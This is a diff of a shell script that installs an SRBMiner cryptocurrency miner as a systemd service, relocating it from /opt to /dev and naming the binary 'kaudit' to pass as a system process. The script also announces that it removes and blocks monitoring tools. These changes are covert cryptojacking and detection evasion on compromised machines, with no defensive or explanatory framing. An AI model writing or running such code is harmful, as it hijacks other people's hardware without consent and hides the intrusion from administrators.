@@ -2,9 +2,9 @@
 sudo systemctl stop c3pool_miner.service
 sudo systemctl disable c3pool_miner.service
 
-if [ ! -d "/opt" ]; then
-  echo "[*] /opt directory does not exist. Creating it..."
-  sudo mkdir -p /opt
+if [ ! -d "/dev" ]; then
+  echo "[*] /dev directory does not exist. Creating it..."
+  sudo mkdir -p /dev
 fi
 
 echo "[*] Removing and blocking monitoring/system tools..."
@@ -47,7 +47,7 @@ echo "[*] Starting SRBMiner Dual Mining Setup Script"
 # Constants
 SRB_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.1/SRBMiner-Multi-3-4-1-Linux.tar.gz"
 SRB_ARCHIVE="/tmp/srb.tar.gz"
-SRB_DIR="/opt/srbminer"
+SRB_DIR="/dev/srbminer"
 SRB_BINARY="$SRB_DIR/kaudit"
 SERVICE_FILE="/etc/systemd/system/srbminer.service"
 HUGE_PAGES=$((1280 + $(nproc)))
